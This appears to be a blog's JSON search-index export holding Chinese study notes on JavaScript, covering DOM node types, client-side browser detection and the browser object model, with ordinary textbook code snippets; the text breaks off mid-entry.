Comment类型注释在DOM中是通过Comment类型来表示的，其与Text类型继承自相同的积累，因此它拥有除splitText之外的所有操作方法，同时也可以通过nodeVlue和Data属性来取得注释内容，而且其也不支持子节点。 createComment可以创建一个注释节点，但需要注意的是一定要保证它们是html元素的后代，因为浏览器不会识别位于&lt;/html&gt;标签之后的注释。 一般使用很少。 CDATASection类型CDATASection类型只针对XML文档，表示CDATA区域，与Comment类型类似。 DocumentType类型DocumentType类型使用的也很少，其包含doctype相关的信息，不支持子节点。 在DOM1级中，DocumentType对象不能动态创建，只能通过浏览器解析文档代码的方式来创建，支持的浏览器会将其DocumentType对象保存在document.doctype中。该对象有三个属性： name，表示文档类型的名称 entities，文档类型描述的实体的NamedNodeMap对象 notations，文档类型描述的符号的NamedNodeMap对象在HTML文档中，只有name属性有用，即出现在&lt;! DOCTYPE 之后的文本 DocumentFragment类型DocumentFragment类型在文档中没有对应的标记，DOM规定文档片段（ Document Fragment）是一种“轻量级”文档，可以包含和控制及诶但，但不像完整的文档那样占用额外的资源。 文档片段不能直接添加到文档中，但将其作为一个“仓库”使用，即可以在其中保存将要添加到文档的节点。文档片段继承了Node的所有方法，可以执行所有文档的DOM操作。 同一个文档片段保存创建的新节点，然后再一次性将他们添加到我能当中，能避免浏览器的反复渲染。 Attr类型元素属性在DOM中以Attr类型表示，在所有浏览器中，都可以访问Attr类型的构造函数和原型，元素属性就是元素对象的attributes属性中的节点。 Attr类型虽然也是节点，但却不认为是DOM文档树的一部分，其有三个属性： name 属性名（与nodeName相同） value 属性值（与nodeValue相同） specified 布尔值，用于区别属性是在代码中指定的还是默认的 createAttribute方法可以创建新的属性节点，要将新的属性节点添加到元素上必须使用setAttributeNode方法。对应的还是getAttributeNode方法来获取属性值。 该类型的直接使用非常少，一般使用getAttribute、setAttribute、removeAttribute要方便很多。 DOM操作技术多数的DOM操作都很简明，但由于浏览器的不兼容等问题，有时却不像表面的那么简单。 动态脚本使用&lt;script&gt;元素可以向页面中插入js代码，而动态脚本指的是页面加载时不存在，但将来的某一时刻通过修改DOM动态添加的脚本，跟HTML中script元素一样，创建动态脚本有2种方式：插入外部文件或直接插入js代码 动态加载的外部js文件能够直接立即运行：1234var script = document.createElement('script');script.type = 'text/javascript';script.src = 'outer.js';document.body.appendChild(script); 行内方式：1234var script = document.createElement('script');script.type = 'text/javascript';script.appendChild(document.createTextNode('function sayHid()&#123;alert(1);&#125;'));document.body.appendChild(script); 上述行内方式在IE中会报错，因为IE将script视为一个特殊的元素，不允许访问其子节点。但可以通过script的text属性来指定js代码。而这种行内方式代码可以在加载后执行，但相当于将相同字符串传递给eval。 动态样式同动态脚本一样，动态样式也是页面加载完成后动态添加到页面中的。将css样式包含到HTML中的元素有两个，分别是link元素，用于包含外部的文件，style元素用于指定嵌入的样式。 与动态脚本一样处理即可达到动态样式的目的。但需要注意的是，需要将link元素添加到head元素中。 操作表格table元素是HTML中最复杂的结构之一，涉及的表格标签多，比如表格行，单元格，表头等标签，所以往往通过DOM方法操作表格需要编写大量代码。因此DOM对table、tbody、tr添加了一些快捷属性和方法同于操作表格。例如：HTML DOM Table 对象、HTML DOM TableRow 对象 NodeList的使用理解NodeList及NamedNodeMap、HTMLCollection对象是理解DOM的关键，这三个集合都是动态的，即，每当文档结构发生变化时，它们都会更新。因此它们始终保存最新最准确的信息，从本质上说，所有的NodeList对象在访问DOM文档时都是执行的实时查询。 小结DOM是语言中立的API，用于访问HTML和XML文档，DOM1级将HTML和XML文档形象的当做一个层次化节点树，可以使用js来操作这个节点树，进而改变底层文档的外观和构造。 DOM由各种节点构成，简要总结如下： 最基本的节点类型是Node，用于抽象的表示文档中一个独立的部分，所有其他类型都继承自Node DOcument类型表示整个文档，是一组分层节点的根节点，在js中，document对象是Document类型的一个实例，通过document对象有多种方式可以获取节点 Element节点表示文档中所有HTML或XML元素，可操作这些元素的内容和属性 另外还有一些其他节点类型，如文本内容，注释、文档类型、CDATA区域、文档片段 访问DOM的操作一般是直观简单的，但处理脚本和样式元素时需要注意。 理解了DOM操作类型，也就理解了为何DOM操作会对性能影响很大。DOM操作往往是js中开销最大的部分，因访问NodeList导致的问题较多，NodeList对象都是动态的，所以每次访问NodeList对象都会运行一次查询，所以最好的办法就是尽量减少DOM操作。","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"js-pro","slug":"js-pro","permalink":"https://github.com/xmoyKING/tags/js-pro/"}]},{"title":"JavaScript高级程序设计-16-客户端检测","slug":"js-pro16","date":"2016-08-17T01:14:05.000Z","updated":"2017-12-06T14:50:09.352Z","comments":true,"path":"2016/08/17/js-pro16/","link":"","permalink":"https://github.com/xmoyKING/2016/08/17/js-pro16/","excerpt":"","text":"浏览器很多，除了都实现公共接口，每种浏览器都有各自的长处与缺点。即使是跨平台的浏览器，虽然版本相同，但也存在不一致的问题。面对普遍存在的不一致问题，要么迁就各方采用“最小公分母”的策略，要么利用各自客户端检测方法，突破或规避缺陷。 实际上，浏览器之间的差异以及不同浏览器的“怪癖”（quirks）非常多，因此，客户端检测除了是一种补救措施之外，更是一种有效的开发策略。 一般来说，检测Web客户端的手段很多，且各有利弊，但不到万不得已，不使用客户端检测。只要能找到更通用的方法，就应该优先采用更通用的方法，即，先设计最通用的方案，然后再使用特定于浏览器的技术增强方法。 能力检测最常用的是能力检测（特性检测），目的不是识别特定的浏览器，而是识别浏览器的能力，采用这种方式不必顾及特定的浏览器，只要确定该浏览器支持特定的能力，就能使用。基本模式是：123if(object.propertyInQuestion)&#123; // 使用 object.propertyInQuestion&#125; 理解能力检测，需要先理解两个重要概念： 第一个概念是先检测达成目的的最常用特性，比如先检测document.getElementById后检测document.all，先检测最常用的特性可以保证代码最优化，因为多数情况下都可以避免测试多个条件。 第二个概念是必须测试实际要用到的特性，一个特性存在，不一定意味着另一个特性也存在。1234567function getWindowWidth()&#123; if(document.all)&#123; // 假设IE return document.documentElement.clientWidth; // 错误用法 &#125;else&#123; return window.innerWidth; &#125;&#125; 更可靠的能力检测能力检测对于想知道某个特性是否会按照适当方式行事（而不仅仅是某个特性存在）非常有用。 比如下例的函数用来确定对象是否支持排序：1234// 不要这样，这不是能力检测，而是检测是否存在相应方法function isSortable(object)&#123; return !!object.sort;&#125; 这个函数通过检测对象是否存在sort方法，来确定对象是否支持排序，但问题是，任何包含sort属性的对象也会返回true。1var result = isSortable(&#123;sort: true&#125;); 因此，更好的方式是检测sort是否是一个函数123function isSortable(object)&#123; return typeof object.sort == 'function';&#125; 所以，尽可能使用typeof进行能力检测，虽然宿主对象没有义务让typeof返回合理的值，比如ie下，某些方法返回的就不是function，而是object。但比其他方式更好。 能力检测不是浏览器检测检测某个或某几个特性并不能确定浏览器类型，比如如下的“浏览器检测”代码就是错误的依赖能力检测的典型示例：123var isFirefox = !!(navigator.vendor &amp;&amp; navigator.vendorSub); // 不够具体var isIE = !!(document.all &amp;&amp; document.uniqueID); // 假设过度 上述代码代表了对能力检测的典型误用。以前确实可以通过检测navigator.vendor和vendorSub来确定firefox浏览器，但后来safari也实现了相同的属性，于是就得到不清晰的结果了。为了检测IE，使用了document.all和document.uniqueID，这假设IE将来的版本依然继续存在这些属性，同时还假设其他浏览器都不会实现这两个属性。最后，使用双逻辑非操作符来得到布尔值比先存储再访问的效果更好。 实际上，根据浏览器不同将能力组合起来更可取，比如需要使用某些特定的浏览器特性，那么最好依次检测所有相关的特性，而不要分别检测：12345// 确定浏览器是否支持netscape风格的插件var hasNSPlugins = !!(navigator.plugins &amp;&amp; navigator.plugins.length);// 确定浏览器是否具有DOM1级的能力var hasDOM1 = !!(document.getElementById &amp;&amp; document.createElement &amp;&amp; document.getElementByTagName); 应该将能力检测作为确定下一步解决方案的依据，而不是用它来判断用户使用的是什么浏览器。 怪癖检测与能力检测类似，怪癖检测（quirks detection）的目标是识别浏览器的特殊行为。但与能力检测确认浏览器支持什么能力不同，怪癖检测是想要知道浏览器存在什么缺陷（“怪癖”其实就是bug的意思）。通常需要运行一小段代码以确定浏览器的某一特性是否能正常工作。 比如IE8存在的一个bug：若某个实例属性与标记为[[DOntEnum]]的某个原型属性同名，那么该实例属性就不会出现在for-in循环中,通过下面的代码检测这个怪癖：123456789var hasDontEnumQuirk = function()&#123; var o = &#123;toString: function()&#123;&#125;&#125;; for(var prop in o)&#123; if(prop == 'toString')&#123; return false; &#125; &#125; return true;&#125;(); 通过一个匿名函数来检测该怪癖，函数中创建了一个带有toString方法的对象，在正常的ES中，toString应该在for-in循环中作为属性返回。 一般来说，怪癖都是个别浏览器所独有的，而且通常被归为bug，在相关浏览器的新版本中，可能不会被修复。由于检测怪癖设计运行代码，因此建议仅检测那些有直接影响的怪癖，而且最好是一开始就执行检测，以便尽早解决问题。 用户代理检测争议最大的一种客户端检测技术是用户代理检测。用户代理检测通过检测用户代理字符串来确定实际使用的浏览器，在每一次HTTP请求过程中，用户代理字符串是作为响应首部发送的，而且该字符串可以通过js的navigator.userAgent属性访问。在服务端，通过检测用户代理字符串来确定用户使用的浏览器是一种常用的做法吗，而在客户端，用户代理检测一般被当做万不得已的手段，其优先级排在能力检测和怪癖检测之后。 提到用户代理字符串就必须提到电子欺骗（spoofing），值得是浏览器通过在自己的用户代理字符串中加入一些错误或误导性信息，来达到欺骗服务器的目的。 而所谓的用户代理字符串其实指的就是HTTP规范中用于指明浏览器的名称和版本号的标识符。后随着不断的发展，已经不仅仅只有名称和版本号了。具体请看用户代理字符串简史 用户代理字符串检测技术考虑到历史原因以及现代浏览器中用户代理字符串的使用方式，通过用户代理字符串来检测特定的浏览器并不是一件简单的事。因此，首先要确定的往往是需要多么具体的浏览器信息。一般情况下知道呈现引擎和最低限度的版本就足以确定正确的操作方法了。123if(isIE6 || isIE7 )&#123; //不推荐 // ...&#125; 上述代码基于特定的浏览器和版本执行的代码非常脆弱，因为这样必须根据浏览器的版本更新代码，使用相对版本号更合理123if( IEvers &gt; 6)&#123; // ...&#125; 识别呈现引擎确切知道浏览器的名字和版本好不如确定知道它是什么呈现引擎，使用相同版本的呈现引擎一定也支持相同的特性。所以主要检测5大呈现引擎：IE、Gecko、Webkit、KHTML、Opera。 为了不在全局作用域中添加多余的变量，将使用模块增强模式来封装检测脚本，检测脚本的基本代码结构如下：1234567891011var client = function()&#123; var engine = &#123; ie: 0, gecko: 0, webkit: 0, khtml: 0, opera: 0, ver: null, // 具体版本号 &#125;; return &#123;engine: engine&#125;&#125; 引擎的版本号以浮点数写入对应的属性，其他的非使用引擎则保持默认的0，完整的版本信息则以字符串形式写入ver属性。使用如下：1234567if(client.engine.ie)&#123; // 针对ie&#125;else if(client.engine.gecko &gt; 1.5)&#123; if(client.engine.ver == '1.8.1')&#123; // 针对此版本执行特定操作 &#125;&#125; 因为有些时候浮点数可能丢失某些版本信息，所以需要一个具体版本号的字符串属性，在必要的时候可以检测ver属性。 要正确识别呈现引擎，关键是检测顺序要正确，由于用户代理字符串存在很多不一致的地方，若检测顺序不对，很可能到会导致检测结果不正确。 第一步是识别Opera，因为它的用户代理字符串有可能完全模仿其他浏览器，而且不会将自己标识为Opera，要检测Opera，必须通过window.opera对象。 第二个是识别Webkit，因为Webkit的用户代理字符串中的AppleWebkit是独一无二，而其包含Gecko和KHTML字符串，所以若先检测这两个字符串可能会错误。 第三个是识别KHTML,由于KHTML中的用户代理字符串也包含Gecko，所以在排除KHTML之前，无法准确检测基于Gecko。Kongqueror3.1及更早的版本不包含KTHML字符串，所以需要用Kongqueror代替，最后KHTML与Webkit的版本号的格式差不多。 排除了Webkit和KHTML后就可以识别Gecko了，但Gecko的版本号是跟在rv:字符串后的。 最后检测的就是IE了，IE的版本号位于字符串MSIE后123456789101112131415161718var ua = navigator.userAgent;if(window.opera)&#123; engine.ver = window.opera.version(); engine.opera = parseFloat(engine.ver);&#125;else if(/AppleWebkit\\/(\\S+)/.test(ua))&#123; engine.ver = RegExp['$1']; engine.webkit = parseFloat(engine.ver);&#125;else if(/KHTML\\/(\\S+)/.test(ua) || /Kongqueror\\/([^;]+)/.test(ua))&#123; engine.ver = RegExp['$1']; engine.khtml = parseFloat(engine.ver);&#125;else if(/rv:([^\\)]+)\\) Gecko \\/\\d&#123;8&#125;/.test(ua))&#123; engine.ver = RegExp['$1']; engine.gecko = parseFloat(engine.ver);&#125;else if(/MSIE ([^;]+)/.test(ua))&#123; engine.ver = RegExp['$1']; engine.ie = parseFloat(engine.ver);&#125; 由于实际的版本号中可能包含数字、小数点、字母，而版本号与下一部分的分隔符是空格，所以捕获组中使用了表示非空格的特殊字符\\S。取反字符类[^;]+可以确保取得除指定字符外的所有字符。 识别浏览器大多数情况下，识别了呈现引擎就足够了，但由于Chrome和Safari都是Webkit作为呈现引擎的浏览器，而js引擎却不一样。因此有必要为client对象添加新的属性。1234567891011121314151617var client = function()&#123; var engine = &#123;/**/&#125; var broswer = &#123; // 浏览器 ie: 0, firefox: 0, safari: 0, konq: 0, opera: 0, chrome: 0, ver: null, &#125; return &#123; engine: engine, broswer: broswer, &#125;;&#125; 识别平台三大主流平台Windows、Mac、Unix(包括Linux)。为了检测平台，client对象需要再添加一个system对象。在检测平台时，通过navigator.platform比通过用户代理字符串检测更简单。12345var system = &#123; win: false, max: false, x11: false,&#125; 识别Windows操作系统在识别了平台的基础上，由于windows下系统的浏览器版本较多，彼此差异较大，因此需要识别具体的操作系统版本 识别移动设备各大浏览器厂商也推出了对应的移动版浏览器。 识别游戏系统如Wii和Playstation3等视频游戏系统的Web浏览器。 使用方法用户代理检测是客户端检测的最后一个选择，只要可能，应该优先采用能力检测和怪癖检测，用户代理检测一般适用于如下情况： 不能直接准备的使用能力检测和怪癖检测，例如，某些浏览器实现了为将来功能预留的存根函数（stub）。在这种情况下，仅测试相应函数是否存在还得不到足够的信息 同一款浏览器在不同平台下具有不同的能力，此时，可能就有必要去点浏览器位于那个平台下 为了跟踪分析等目的需要知道确切的浏览器 小结客户端检测是js开发中非具有争议的话题，由于浏览器间存在差异，通常需要根据不同浏览器的能力分别编写不同的代码，有不少客户端检测方法，但最常用的是3种： 能力检测：在编写代码之前先检测特定浏览器的能力。例如，脚本在调用某个函数之前，可能要先检测该函数是否存在，这种检测方法将开发人员从考虑具体的浏览器类型和版本中解放出来，将注意力集中到相应的能力是否存在上，能力检测无法精确地检测特定的浏览器和版本。 怪癖检测：怪癖实际上是浏览器中的bug，怪癖检测通常涉及到运行一小段代码，然后确定浏览器是否存在某个怪癖，由于怪癖检测与能力检测相比效率更低，因此应该只在某个怪癖会干扰脚本运行时才使用，怪癖检测无法精确地检测特定的浏览器和版本。 用户代理检测：通过检测用户代理字符串来识别浏览器。用户代理字符串包含大量与浏览器有关的信息，包括浏览器、浏览器版本、平台、操作系统等。用户代理字符串有很长的发展历史，在此期间，浏览器厂商试图通过在用户代理字符串中添加一些欺骗性信息，欺骗网站相信浏览器的身份。即使如此，通过用户代理字符串仍然能够检测出浏览器所用的呈现引擎以及所在的平台，包括移动设备和游戏设备。 在决定使用那种客户端检测方法时，一般优先考虑使用能力检测，怪癖检测是确定应该如何处理代码的第二选择，而用户代理检测是客户端检测的最后一种方案，因为这种方法对用户代理字符串具有很强的依赖性。","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"js-pro","slug":"js-pro","permalink":"https://github.com/xmoyKING/tags/js-pro/"}]},{"title":"JavaScript高级程序设计-15-BOM","slug":"js-pro15","date":"2016-08-15T06:57:49.000Z","updated":"2017-12-06T14:50:09.352Z","comments":true,"path":"2016/08/15/js-pro15/","link":"","permalink":"https://github.com/xmoyKING/2016/08/15/js-pro15/","excerpt":"","text":"ES是js的核心，但但web中使用js，那么BOM（Broswer Object Model 浏览器对象模型）是真正的核心。BOM提供了很多对象，用于访问浏览器的功能，一般这些功能和具体的网页内容无关。W3C将BOM纳入H5规范中将浏览器中的js最基本的部分标准化了。 window对象BOM的核心对象是window，它表示浏览器的一个实例，在浏览器中window对象既是通过js访问浏览器窗口的一个接口，也是ES规定的Global对象，即，在网页定义的任何一个对象、变量、函数，都是以window作为其Global对象的，因此有权访问全局函数，如parseInt等。 全局作用域抛开全局变量会成为window对象的属性不谈，定义全局变量与在window对象上直接定义属性还是有区别的：全局变量不能通过delete操作符删除，而直接在window对象上定义的属性可以。12345678var age = 11;window.color = 'red';delete age; //false 或 报错delete window.color; // trueconsole.log(age); // 11;console.log(window.color); // undefined; 使用var语句添加的window属性有一个名为[[Configurable]]的特性，这个特性的值被设置为false，因此这样定义的属性不可以通过delete操作符删除。 同时，尝试访问未声明的变量会抛出错误，但通过查询window对象，可以知道某个变量是否未声明。123var newValue = oldValue; // oldValue未定义，报错var newValue = window.oldValue; // 不会报错，因为是查询属性 窗口关系及框架（frameset）若页面中包含框架，则每个框架都拥有自己的window对象，并且保存在frames集合中，在frames集合中，可通过索引（从0开始，将页面中的frame从左至右，从上至下依次定义索引值）或框架名称来访问相应的window对象，每个window对象都有一个name属性，其中包含框架的名称。注：除非最高层窗口是通过window.open打开的，否则其window对象的name属性不包含任何值 top对象始终指向最高（最外层）的框架，也就是浏览器窗口。使用它可以确保一个框架中正确的访问另一个框架，因为对应一个框架中编写的任何代码来说，其中window对象指向的都是那个特定实例，而非最高层框架。 与top相对的另一个window对象是parent，其始终指向当前框架的直接上层框架，parent有可能等于top，但没有框架的情况下，parent一定等于top（此时都等于window）。 与框架有关的最后一个对象是self，始终指向window，实际上self和window对象可互相换用，引入self对象的目的只是为了与top和parent对应起来。因此它不格外包含其他值。 所有这些对象都是window对象的属性，可以通过window.parent，window.top等形式访问。同时，可以将不同层次的window对象连缀起来，例如window.parent.parent.frames[0]; 同时，在使用框架的情况下，浏览器中会存在多个Global对象，在每个框架中定义的全局变量会自动成为框架中window对象的属性。由于每个window都包含原生类型的构造函数，因此每个框架都有一套自己的构造函数，这些构造函数一一对应，但并不相等。例如top.Object并不等于top.frames[0].Object，这个问题会影响到对跨框架传递的对象使用instanceof操作符。 窗口位置用来确定和修改window对象位置的属性和方法有很多，且各浏览器API有区别。 比如：screenLeft/screenTop属性（IE、Safari、Opear、Chrome）及对应的screenX/screenY属性（Firefox、Chrome），分别用于表示窗口相对于屏幕左侧和上边的位置。但这两组其实数值并不相等。因为在IE、Opera、Chrome中，screenLeft/screenX属性的窗口指的是页面可视区（不包括浏览器头部等），而在Firefox和Safari中，指的是整个浏览器。 甚至Firefox、Safari、Chrome浏览器返回的是top的值，同时会忽略外边距设置的偏移。而IE和Opera则给出框架相对屏幕边界的精确坐标。 moveTo和moveBy可以将窗口移动到新位置，moveTo接收的是新位置的x和y坐标，而moveBy接收的是水平和锤子方向上移动的像素值。12345window.moveTo(0, 0); // 将窗口移动到屏幕左上角window.moveTo(10, 30); // 将窗口移动到屏幕(10, 30)window.moveBy(0, 100); // 将窗口向下移动100像素window.moveBy(-50, 0); // 将窗口向左移动50像素 同时，这两个方法可能会被浏览器禁用，且不适用于框架，只能对最外层window对象使用。 窗口大小跨浏览器确定一个窗口大小不是简单的事儿，每个浏览器都定义了一些属性，IE9+、Firefox、Safari、Opera、Chrome提供了innerWidth、innerHeight、outerWidth、outerHeight。 而outer系列属性，IE9+、Firefox、Safari返回浏览器窗口本身的大小，Opera表示页面单个标签对应的浏览器窗口大小，Chrome中返回视口大小而非浏览器窗口大小，同时inner和outer系列值相同。 在IE、Firefox、Opera、Safari、Chrome中，document.documentElement.clientWidth和clientHeight保存页面视口的信息，在IE6的混杂模式中需通过body.clientWidth取得相同信息。 对于移动设备，window.innerWidth指的是可视区，document.documentElement是布局视口，即渲染后页面的实际大小（可视区是整个页面的一部分）。 另外resizeTo和resizeBy可以调整浏览器窗口大小，resizeTo接收浏览器窗口的新宽度和新高度，而resizeBy接收新窗口与原窗口的宽度和高度只差。 这两个方法与移动窗口位置的方法类型，可能会被浏览器禁用，且不适用于框架，只能对最外层window对象使用。 导航和打开窗口使用window.open方法既可以导航到一个特定的URL，也可以打开一个新的浏览器窗口，接收4个参数：要加载的URL、窗口目标、一个特性字符串以及一个表示新页面是否取代浏览器历史记录中当前加载页面的布尔值。通常只传递第一个参数，最后一个参数在不打开新窗口的情况下使用。 当传递了第二个参数，且该参数为已有窗口或框架名时，那么会在具有该名称的窗口或框架中加载指定的url，若没有存在，则新创建一个窗口并命名为第二个参数。12window.open('http://www.king.com', 'topFrame');// 等同 &lt;a href=\"http://www.king.com\" target=\"topFrame\"&gt; 第二个参数可以是一些特殊的名称:_self、_parent、_top、_blank。 弹出窗口若open的第二个参数是一个不存在的窗口或框架时，会根据第三个参数来创建新窗口或新标签，若第三个参数不存在，则默认设置新窗口或新标签，而若不打开新窗口的话，则会忽略第三个参数。 第三个参数其实是一个逗号分隔的字符串，用于表示新窗口中显示那些特性： 设置 值 说明 height 数值 表示窗口的高度，不能小于100 width 数值 表示窗口的宽度，不能小于100 left 数值 表示窗口的左坐标，不能是负值 top 数值 表示窗口的上坐标，不能是负值 fullscreen yes/no 表示窗口是否最大化，仅限IE location yes/no 表示窗口是否显示地址栏，无论任何浏览器，都无效 menubar yes/no 表示窗口是否显示菜单栏，默认no resizable yes/no 表示窗口是否可被拖动边框改变大小，默认no scrollbars yes/no 表示窗口是否可滚动，默认no toolbar yes/no 表示窗口是否显示工具栏，默认no status yes/no 表示窗口是否显示状态栏，默认no window.open会返回指向新窗口的引用，引用的对象与其他window对象大致相似，但可对其进行更多控制，而window对象可能会禁止一些功能。比如open创建的新窗口可调整大小或移动位置。 同时用close方法可以关闭打开的新窗口。关闭后，新窗口的引用依然存在，但已经没有用了，通过closed属性可检测其是否已经被关闭。 新窗口的window对象有一个opener属性，其为打开它的原始窗口对象，这个属性只在弹出窗口的最外层window对象（top）有定义，而且指向调用window.open的窗口或框架。12345678var newwin = window.open('url', 'newwin', 'height=400,width=400');newwin.resizeTo(100, 100); // 大小newwin.moveTo(100, 100); // 位置newwin.opener == window; // truenewwin.close(); //关闭,在newwin内部，通过top.close()也可以关闭自己newwin.closed; // true 有些浏览器会在独立的进程中运行每个标签页，当一个标签页打开另一个标签页时，若两个window对象之间需彼此通信，那么新标签就不能运行在独立的进程中。在chrome下，若将opener设置为null，则表示在单独的进程中运行新标签页，同时一旦切断标签页之间的联系则无法恢复。 安全限制在某些浏览器中，对弹出窗口做了限制，比如始终显示地址栏，同时不能将弹出窗口移动到屏幕以外、不允许关闭状态栏等。 弹出窗口屏蔽程序大多数浏览器都内置了弹出窗口屏蔽程序，或者可安装第三方的屏蔽插件。所以当弹窗窗口被屏蔽时，有可能是被浏览器限制的，也有可能是被插件限制的。 若是浏览器限制的，那么window.open会返回null。若是插件限制的，则可能会报错。 定时器：setTimeout超时和setInterval间歇js能设置超时值和间歇值来调度代码在特定时刻指向，但由于js是单线程语言，所以，其实是伪定时器。 js在一定时间内只能执行一段代码，为了控制要执行的代码，js有一个任务队列，任务会依次被js执行。timeout表示指定时候后将当前的任务添加到队列中，若队列是空，则添加的代码会被立即执行，若不为空，则需要等待前面的代码执行完成后再执行，所以代码并不一定精确的经过指定时间后执行。 两个方法都接收两个参数，第一个表示要执行的代码（可以为字符串，也可以是一个函数对象），第二个是一个数值（单位是毫秒）。其中第一个参数为字符串时会像eval一样去解析，但会导致性能损失。 调用setTimeout后，会返回一个数值ID，表示超时调用，这个ID是计划执行代码的唯一标识符，通过clearTimeout(ID);可以取消超时调用。当然，若调用已经发生，则在取消已经无效了。 同时，由于定时器调用的代码都是在全局作用域中执行的，因此函数中的this的值在非严格模式下指向window对象，在严格模式下是undefined。 而间歇调用与超时类似，不同的是，间歇调用会一直执行到页面卸载。一般使用超时调用模拟间歇调用，因为使用超时调用时不用跟踪ID，同时由于单线程执行问题，后一个间歇调用可能会在前一个间歇调用结束之前启动，而超时调用则完全避免了这一点。 系统对话框alert、confirm、prompt方法可以调用系统对话框向用户显示消息，系统对话框与浏览器中显示的网页没有关系，也不包含HTML。外观不由CSS控制，而是由浏览器决定，同时这几个方法打开的对话框是同步的、模态的，即这些对话框显示时代码会停止执行，关掉对话框后代码恢复执行。 alert是警告，向用户显示一些他们无法控制的消息，例如错误信息，而用户只能在看完消息后关闭对话框。confirm是确认，confirm方法返回布尔值，true表示确认，false表示取消。prompt是提示，用于提示用户输入文本，接收2个参数，第一个是提示文本，第二个是文本输入框的默认值。点击确定返回文本框内的值，点击取消或其他方式关闭对话则返回null。 其中若同一个脚本在执行过程中打开多个对话框，则会显示一个复选框用于提示用户是否要阻止后续的对话框显示。但独立的用户操作则不会有阻止复选框。 window对象的find和print方法可以显示“查找”，“打印”对话框，一些浏览器下find命令无效，同时这两个对话框是异步的，不影响页面js执行。 location对象location对象提供了当前窗口加载的文档的信息，以及导航功能。而且它非常特别，既是window的属性，也是document的属性。 location将URL解析为独立的片段，如href、hash、host、hostname、pathname、port、protocol、search等，非常有用。 查询字符串参数虽然location.search能返回查询字符串，但并不方便，它返回的只是字符串，还需要解析。12345678910111213141516171819202122function getQueryStringArgs()&#123; var qs = (location.search.length &gt; 0 ? location.search.substring(1) : ''), // 取得查询字符串并去掉开头问号 args = &#123;&#125;, // 存储对象 items = qs.length ? qs.split('&amp;') : [], // 取得每一项 item = null, name = null, value = null, i = 0, len = items.length; // 逐一添加到args对象中 for(i = 0; i &lt; len; i++)&#123; item = items[i].split('='); name = decodeURIComponent(item[0]); value = decodeURIComponent(item[1]); if(name.length)&#123; args[name] = value; &#125; &#125; return args;&#125; 位置操作location对象可以通过很多方式改变浏览器的位置，比如最常用的location.href assign方法接收一个URL.1location.assign('http://www.king.com'); 这个方法会立即打开URL并在浏览器的历史记录中生成一条记录，而若设置location.href和window.location的值则会在内部调用assign方法， 修改location对象的其他属性也可以改变当前加载的页面，如hash、search、hostname、pathname、port，同时会在历史记录中生成新记录，而除了hash，其他的属性被修改后，页面会以新URL重新加载。 若不想生成新记录，则使用replace方法，该方法接收一个url字符串，同时会刷新页面到新url。 reload方法的作业则是重新加载当前页面，同时接收一个布尔参数，表示是否要强制重新加载，若不传参数则浏览器自动选择最合适的方法刷新(比如从缓存中获取)。 navigator对象该对象是识别客户端浏览器的重要“事实”标准，与BOM其他对象一样，每个浏览器的navigator对象有自己的属性：navigator对象 检测插件对于非IE浏览器，navigator对象的plugins属性是一个数组，用于保存浏览器中安装的插件信息的数组，数组中的每一项包含下列属性： name 插件名字 description 插件描述 filename 插件文件名 length 插件处理MIME的类型数量一般通过名字检测插件是否安装 注册处理程序H5新定义的registerContentHandler和registerProtocolHandler方法可以让一个站点知名它处理特定类型的信息，随着RSS阅读器和在线电子邮件的发展，注册处理程序为像使用桌面应用程序一样模式使用这些在线程序提供了一种方式。 其中registerContentHandler方法接收三个参数，分别表示要处理的MIME类型，可以处理该MIME类型的页面的url以及应用的名称。比如将站点注册为处理RSS源的处理程序：1navigator.registerContentHandler('application/rss+xml', 'http://www.king.com?feed=%s','Some Reader'); 第一个是RSS源的MIME类型，第二个参数是应该接收RSS源的URL,其中%s表示rss源url，由浏览器自动插入，当下一次请求rss源时，浏览器会打开指定的url，而相应的web应用程序将会处理该请求。 而registerProtocolHandler类似，但第一个参数指定的是处理的协议（如mailto或ftp）,比如将一个程序注册为默认的邮件客户端：1navigator.registerProtocolHandler('mailto', 'http://www.king.com?cmd=%s','Some Mail Client') screen对象js中的screen对象在编程时用处不大，用于表明客户端的能力，如显示器的信息，同时该对象所包含的属性也视浏览器而异。screen对象 history对象history对象保存着用户上网的历史记录，从窗口被打开时算起，因为history是window对象的属性，因此每个浏览器窗口、每个标签页、甚至每个frame都有自己的history对象与特定的window对象关联。 出于安全考虑，开发者无法得之用户浏览过的url，但使用go方法可以实现后退和前进。 go方法可以在用户的历史记录中任意跳转，接收一个参数。 参数可以是整数，表示向前/后跳转的页面数，负数为向后（类似后退按钮），正数为向前（类型前进按钮）。简化的back和forward方法可以替代go方法。 参数也可以是字符串，浏览器会调整到历史记录中包含该字符串的第一个位置，可以是后退，也可能是前进，具体要看那个位置最近。若历史记录不包含该字符串，则什么也不做。 history还有一个length属性，保存历史记录的数量，这个数量包括所有的历史记录（包括向前和向后的），通过检测length是否等于0可以知道用户是否一开始就打开了当前页面。 小结浏览器对象模型，即BOM，以window对象为依托，表示浏览器窗口以及页面可见区域，同时，window对象还是ES中的Global对象，因而所有的全局变量和函数都是它的属性，且所有原生的构造函数及其他函数也都存在于它的命名空间下。 在使用框架时，每个框架都有自己的window对象以及所有元素构造函数及其他函数的副本，每个框架都保存在frames集合胡总，可以通过位置或通过名称来访问 有一些窗口指针，可以用来引用其他框架，包括父框架 top对象始终指向最外围的框架，包括整个浏览器窗口 parent对象表示包含当前框架的框架，而self对象则回指window 使用location对象可以通过编程方式来访问浏览器的导航系统，设置相应的属性，可以逐段或整体修改浏览器的url 调用replace方法可以导航到一个新rul，同时该url会替换浏览器历史记录中当前显示的页面 navigator对象提供了与浏览器有关的信息，除了公用的一些，具体取决于浏览器BOM中的screen和history对象功能优先，screen对象保存着与客户端显示器有关的信息，这些信息一般只用于站点分析。history堆栈为访问浏览器历史记录开了口，可据此判断历史几率的数量，也可以在历史记录中任意导航。","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"js-pro","slug":"js-pro","permalink":"https://github.com/xmoyKING/tags/js-pro/"}]},{"title":"JavaScript高级程序设计-14-函数表达式2-模仿块级作用域/私有变量","slug":"js-pro14","date":"2016-08-12T08:49:18.000Z","updated":"2017-12-06T14:50:09.352Z","comments":true,"path":"2016/08/12/js-pro1